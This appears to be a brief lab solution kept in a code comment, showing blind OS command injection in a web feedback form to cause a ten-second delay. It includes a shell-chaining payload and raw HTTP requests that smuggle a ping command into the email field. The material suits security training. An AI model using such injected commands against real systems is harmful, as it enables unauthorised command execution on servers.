/*



blind OS command injection vulnerability in the feedback function.
The app executes a shell command containing the user-supplied details. 
The output from the command is not returned in the response.

exploit the blind OS command injection vulnerability to cause a 10 second delay. 

1) & ping -c 10 127.0.0.1 &

2) POST /feedback/submit HTTP/2
csrf=token&name=victim&email=victim%40123.com&subject=goddamn&message=god+says+everything+is+possible

POST /feedback/submit HTTP/2
csrf=token&name=victim&email=victim%40123.com||+ping+-c+10+127.0.0.1||&subject=goddamn&message=god+says+everything+is+possible


*/